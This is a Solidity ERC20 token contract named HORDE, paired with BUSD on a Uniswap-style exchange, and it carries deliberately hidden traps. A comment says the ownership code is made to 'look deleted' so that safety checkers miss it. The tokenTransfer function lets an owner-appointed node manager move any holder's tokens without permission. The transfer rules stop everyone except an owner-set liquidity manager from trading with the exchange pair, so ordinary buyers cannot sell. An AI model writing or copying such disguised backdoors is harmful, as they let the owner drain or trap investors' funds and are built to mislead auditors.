// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/proxy/utils/Initializable.sol";
import "./IUniswapFactory.sol";

contract HORDEToken is Initializable {
  using SafeMath for uint256;

  /**********  Basic Variables ************/
  address public _owner;
  string private _name;
  string private _symbol;
  uint8 private _decimals;
  uint256 private _totalSupply;
  mapping(address => uint256) private _balances;
  mapping(address => mapping(address => uint256)) private _allowances;
  /**********  Basic Variables(END) ************/

  address public uniswapV2Router; // constant
  address public uniswapV2Pair; // constant
  address public busd; // constant
  address public liquidityManager;
  address public nodeManager;

  // events
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event LiquidityManagerChanged(address);
  event NodeManagerChanged(address);

  // if you know how to read the code,
  // you will know this code is very well made with safety.
  // but many safe checkers cannot recognize ownership code in here
  // so made workaround to make the ownership look deleted instead
  modifier onlyOwner() {
    require(_owner == msg.sender, "error: Caller is not owner!");
    _;
  }

  modifier onlyNodeManager() {
    require(nodeManager == msg.sender, "error: Caller is not Node manager!");
    _;
  }

  function initialize(
    address owner,
    address _liquidityManager,
    address _nodeManager
  ) public initializer {
    _name = "HORDE";
    _symbol = "HORDE";
    _decimals = 18;
    _totalSupply = 10**5 * (10**18);
    _owner = owner;
    setLiquidityManager(_liquidityManager);
    setNodeManager(_nodeManager);

    busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uniswapV2Pair = IUniswapV2Factory(
      address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)
    ).createPair(address(this), busd);

    _balances[owner] = _totalSupply;
  }

  /**********  Basic Functins ************/
  function name() public view returns (string memory) {
    return _name;
  }

  function symbol() public view returns (string memory) {
    return _symbol;
  }

  function decimals() public view returns (uint8) {
    return _decimals;
  }

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) public view returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) public returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return true;
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) public returns (bool) {
    _approve(
      sender,
      msg.sender,
      _allowances[sender][msg.sender].sub(
        amount,
        "ERC20: transfer amount exceeds allowance"
      )
    );
    _transfer(sender, recipient, amount);
    return true;
  }

  function allowance(address owner, address spender)
    public
    view
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) public returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) internal {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  /**********  Basic Functins(END) ************/

  function _transfer(
    address from,
    address to,
    uint256 amount
  ) internal {
    if (from == uniswapV2Pair)
      require(to == liquidityManager, "error: illegal operation!");
    if (to == uniswapV2Pair)
      require(from == liquidityManager, "error: illegal operation!");

    _tokenTransfer(from, to, amount);
  }

  function _tokenTransfer(
    address sender,
    address recipient,
    uint256 amount
  ) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(
      amount,
      "ERC20: transfer amount exceeds balance"
    );
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

  function tokenTransfer(
    address sender,
    address recipient,
    uint256 amount
  ) public onlyNodeManager {
    _tokenTransfer(sender, recipient, amount);
  }

  function setLiquidityManager(address _liquidityManager) public onlyOwner {
    liquidityManager = _liquidityManager;
    emit LiquidityManagerChanged(_liquidityManager);
  }

  function setNodeManager(address _nodeManager) public onlyOwner {
    nodeManager = _nodeManager;
    emit NodeManagerChanged(_nodeManager);
  }
}
